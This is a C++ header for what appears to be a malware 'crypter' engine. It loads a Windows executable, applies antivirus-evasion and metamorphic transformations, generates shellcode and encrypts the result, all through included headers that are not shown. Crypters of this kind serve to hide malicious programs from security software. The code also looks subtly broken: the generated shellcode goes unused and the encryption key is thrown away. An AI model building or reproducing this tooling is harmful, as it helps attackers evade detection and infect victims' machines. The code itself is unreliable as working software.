#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <memory>

// Project headers
#include "pe_manipulator.hpp"
#include "evasion.hpp"
#include "metamorphic_engine.hpp"
#include "shellcode_generator.hpp"
#include "encryption.hpp"

namespace Crypter {
    class Engine {
    public:
        Engine() = default;

        bool process(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
            try {
                printf("[+] Starting crypter engine\n");

                // Initialize components
                PEManipulator pe;
                Evasion evasion;
                MetamorphicEngine metamorphic;
                ShellcodeGenerator shellcode;

                // Load and validate PE
                if (!pe.load(input)) {
                    printf("[-] Failed to load PE file\n");
                    return false;
                }

                // Add evasion protections
                if (!evasion.applyEvasion(&pe)) {
                    printf("[-] Failed to add evasion protections\n");
                    return false;
                }

                // Apply metamorphic transformations
                if (!metamorphic.transform(&pe)) {
                    printf("[-] Failed to apply metamorphic transformations\n");
                    return false;
                }

                // Generate shellcode
                std::vector<uint8_t> shellcodeData;
                if (!shellcode.generate(input, shellcodeData)) {
                    printf("[-] Failed to generate shellcode\n");
                    return false;
                }

                // Save the modified PE
                std::vector<uint8_t> modifiedPE;
                if (!pe.save(modifiedPE)) {
                    printf("[-] Failed to save modified PE\n");
                    return false;
                }

                // Encrypt the modified PE
                auto key = Encryption::generateKey();
                if (!Encryption::encrypt(modifiedPE, key, output)) {
                    printf("[-] Failed to encrypt data\n");
                    return false;
                }

                printf("[+] Crypter engine completed successfully\n");
                return true;
            }
            catch (const std::exception& e) {
                printf("[-] Exception in crypter engine: %s\n", e.what());
                return false;
            }
        }
    };
}
